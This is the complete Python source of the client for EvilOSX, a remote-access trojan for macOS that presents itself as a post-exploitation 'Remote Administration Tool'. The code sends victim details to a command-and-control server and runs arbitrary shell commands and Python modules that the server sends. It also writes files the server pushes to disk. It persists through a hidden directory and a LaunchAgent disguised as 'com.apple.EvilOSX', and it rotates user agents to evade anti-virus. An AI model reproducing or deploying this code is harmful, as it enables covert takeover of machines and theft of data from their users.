#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""EvilOSX is a pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX."""
# Random Hash: This text will be replaced when building EvilOSX.
__author__ = "Marten4n6"
__license__ = "GPLv3"
__version__ = "1.1.0"

import time
import urllib2
import urllib
import random
import getpass
import uuid
import subprocess
from threading import Timer
import traceback
import os
import base64
from StringIO import StringIO
import sys
import ssl

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 1337
DEVELOPMENT = False
LAUNCH_AGENT_NAME = "com.apple.EvilOSX"

COMMAND_INTERVAL = 0.5  # Interval in seconds to check for commands.
IDLE_TIME = 60  # Time in seconds after which the client will become idle.

MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"


def receive_command():
    """Receives a command to execute from the server."""
    request_path = "https://{0}:{1}/api/get_command".format(SERVER_HOST, SERVER_PORT)
    headers = {"User-Agent": _get_random_user_agent()}

    username = run_command("whoami")
    hostname = run_command("hostname")
    remote_ip = run_command("curl -s https://icanhazip.com/ --connect-timeout 3")
    current_path = run_command("pwd")

    if remote_ip == "":
        remote_ip = "Unknown"

    # Send the server some basic information about this client.
    data = urllib.urlencode(
        {"client_id": get_uid(), "username": username, "hostname": hostname,
         "remote_ip": remote_ip, "path": current_path}
    )

    # Don't check the hostname when validating the CA.
    ssl.match_hostname = lambda cert, hostname: True

    request = urllib2.Request(url=request_path, headers=headers, data=data)
    response = urllib2.urlopen(request, cafile=get_ca_file())

    response_line = str(response.readline().replace("\n", ""))
    response_headers = response.info().dict

    if response_line == "" or response_line == "You dun goofed.":
        return None, None, None
    elif "content-disposition" in response_headers and "attachment" in response_headers["content-disposition"]:
        # The server sent us a file to download (upload module).
        decoded_header = base64.b64decode(response_headers["x-upload-module"]).replace("\n", "")

        output_folder = os.path.expanduser(decoded_header.split(":")[1])
        output_name = os.path.basename(decoded_header.split(":")[2])
        output_file = output_folder + "/" + output_name

        if not os.path.exists(output_folder):
            send_response("MODULE|upload|" + base64.b64encode(
                MESSAGE_ATTENTION + "Failed to upload file: invalid output folder."
            ))
        elif os.path.exists(output_file):
            send_response("MODULE|upload|" + base64.b64encode(
                MESSAGE_ATTENTION + "Failed to upload file: a file with that name already exists."
            ))
        else:
            with open(output_file, "wb") as output:
                while True:
                    data = response.read(4096)

                    if not data:
                        break
                    output.write(data)

            send_response("MODULE|upload|" + base64.b64encode(
                MESSAGE_INFO + "File written to: " + output_file
            ))
        return None, None, None
    else:
        if response_line.startswith("MODULE"):
            return "MODULE", response_line.split("|")[1], base64.b64decode(response_line.split("|")[2])
        else:
            return "COMMAND", None, base64.b64decode(response_line.split("|")[2])


def get_uid():
    """:return The unique ID of this client."""
    # The client must be connected to WiFi anyway, so getnode is fine.
    # See https://docs.python.org/2/library/uuid.html#uuid.getnode
    return getpass.getuser() + "-" + str(uuid.getnode())


def _get_random_user_agent():
    """:return A random user-agent string."""
    # Used to hopefully make anti-virus less suspicious of HTTPS requests.
    # Taken from https://techblog.willshouse.com/2012/01/03/most-common-user-agents/
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
    ]
    return random.choice(user_agents)


def run_command(command, cleanup=True):
    """Runs a system command and returns its response."""
    if len(command) > 3 and command[0:3] == "cd ":
        try:
            os.chdir(os.path.expanduser(command[3:]))
            return MESSAGE_INFO + "Directory changed."
        except Exception as ex:
            print MESSAGE_ATTENTION + str(ex)
            return str(ex)
    else:
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            timer = Timer(5, lambda process: process.kill(), [process])

            try:
                # Kill process after 5 seconds (in case it hangs).
                timer.start()
                stdout, stderr = process.communicate()
                response = stdout + stderr

                if cleanup:
                    return response.replace("\n", "")
                else:
                    if len(response.split("\n")) == 2:  # Response is one line.
                        return response.replace("\n", "")
                    else:
                        return response
            finally:
                timer.cancel()
        except Exception as ex:
            print MESSAGE_ATTENTION + str(ex)
            return str(ex)


def run_module(module_code, module_name):
    """Executes a module sent by the server."""
    try:
        new_stdout = StringIO()
        new_stderr = StringIO()

        old_stdout = sys.stdout
        old_stderr = sys.stderr

        # Redirect output.
        sys.stdout = new_stdout
        sys.stderr = new_stderr

        exec module_code in globals()
        # TODO - Find a way to remove the executed code from globals.

        # Restore output.
        sys.stdout = old_stdout
        sys.stderr = old_stderr

        return "{0}|{1}|{2}".format("MODULE", module_name, base64.b64encode(
            new_stdout.getvalue() + new_stderr.getvalue()
        ))
    except Exception:
        response = base64.b64encode(MESSAGE_ATTENTION + "Error executing module: " + traceback.format_exc())
        return "{0}|{1}|{2}".format("MODULE", module_name, response)


def send_response(response):
    """Sends a response to the server."""
    request_path = "https://{0}:{1}/api/response".format(SERVER_HOST, SERVER_PORT)
    headers = {"User-Agent": _get_random_user_agent()}
    data = urllib.urlencode({"output": base64.b64encode(response)})

    request = urllib2.Request(url=request_path, headers=headers, data=data)
    urllib2.urlopen(request, cafile=get_ca_file())


def setup_persistence():
    """Makes EvilOSX persist system reboots."""
    run_command("mkdir -p {0}".format(get_program_directory()))
    run_command("mkdir -p {0}".format(get_launch_agent_directory()))

    # Create launch agent
    print MESSAGE_INFO + "Creating launch agent..."

    launch_agent_create = """\
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>KeepAlive</key>
            <true/>
            <key>Label</key>
            <string>{0}</string>
            <key>ProgramArguments</key>
            <array>
                <string>{1}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
        </plist>
        """.format(LAUNCH_AGENT_NAME, get_program_file())

    with open(get_launch_agent_file(), "w") as open_file:
        open_file.write(launch_agent_create)

    # Move EvilOSX
    print MESSAGE_INFO + "Moving EvilOSX..."

    if DEVELOPMENT:
        with open(__file__, "rb") as input_file, open(get_program_file(), "wb") as output_file:
            output_file.write(input_file.read())
    else:
        os.rename(__file__, get_program_file())
    os.chmod(get_program_file(), 0777)

    # Load launch agent
    print MESSAGE_INFO + "Loading launch agent..."

    output = run_command("launchctl load -w {0}".format(get_launch_agent_file()))

    if output == "":
        if run_command("launchctl list | grep -w {0}".format(LAUNCH_AGENT_NAME)):
            print MESSAGE_INFO + "Done!"
            sys.exit(0)
        else:
            print MESSAGE_ATTENTION + "Failed to load launch agent."
    elif "already loaded" in output.lower():
        print MESSAGE_ATTENTION + "EvilOSX is already loaded."
        sys.exit(0)
    else:
        print MESSAGE_ATTENTION + "Unexpected output: " + output
        pass


def get_program_directory():
    """:return The program directory where EvilOSX lives."""
    return os.path.expanduser("~/Library/Containers/.EvilOSX")


def get_program_file():
    """:return The path to the EvilOSX file."""
    return get_program_directory() + "/EvilOSX"


def get_launch_agent_directory():
    """:return The directory where the launch agent lives."""
    return os.path.expanduser("~/Library/LaunchAgents")


def get_launch_agent_file():
    """:return The path to the launch agent."""
    return get_launch_agent_directory() + "/{0}.plist".format(LAUNCH_AGENT_NAME)


def get_ca_file():
    """:return The path to the server certificate authority file."""
    ca_file = get_program_directory() + "/server_cert.pem"

    if not os.path.exists(ca_file):
        # Ignore the CA only for this request!
        request_context = ssl.create_default_context()
        request_context.check_hostname = False
        request_context.verify_mode = ssl.CERT_NONE

        request = urllib2.Request(url="https://{0}:{1}/api/get_ca".format(SERVER_HOST, SERVER_PORT))
        response = urllib2.urlopen(request, context=request_context)

        with open(ca_file, "w") as input_file:
            input_file.write(base64.b64decode(str(response.readline())))
        return ca_file
    else:
        return ca_file


def main():
    """Main program loop."""
    last_active = time.time()  # The last time a command was requested from the server.
    idle = False

    if os.path.dirname(os.path.realpath(__file__)).lower() != get_program_directory().lower():
        if not DEVELOPMENT:
            # Setup persistence.
            setup_persistence()

    while True:
        try:
            print MESSAGE_INFO + "Receiving command..."
            command_type, module_name, command = receive_command()

            if command:
                last_active = time.time()
                idle = False

                if command_type == "COMMAND":
                    # Run a system command.
                    print MESSAGE_INFO + "Running command: " + command

                    send_response("{0}||{1}".format(
                        "COMMAND", base64.b64encode(run_command(command, cleanup=False))
                    ))
                elif command_type == "MODULE":
                    # Run a module.
                    print MESSAGE_INFO + "Running module..."

                    send_response(run_module(command, module_name))
            else:
                print MESSAGE_INFO + "No command received."

                if idle:
                    time.sleep(30)
                elif (time.time() - last_active) > IDLE_TIME:
                    print MESSAGE_INFO + "The last command was a while ago, switching to idle..."
                    idle = True
                else:
                    time.sleep(COMMAND_INTERVAL)
        except Exception as ex:
            if "Connection refused" in str(ex):
                # The server is offline.
                print MESSAGE_ATTENTION + "Failed to connect to the server."
                time.sleep(5)
            elif "certificate" in str(ex):
                # Invalid certificate authority.
                print MESSAGE_ATTENTION + "Error: {0}".format(str(ex))
                print MESSAGE_ATTENTION + "Invalid certificate authority, removing..."
                os.remove(get_program_directory() + "/server_cert.pem")
            else:
                print MESSAGE_ATTENTION + traceback.format_exc()
                time.sleep(5)


if __name__ == '__main__':
    main()
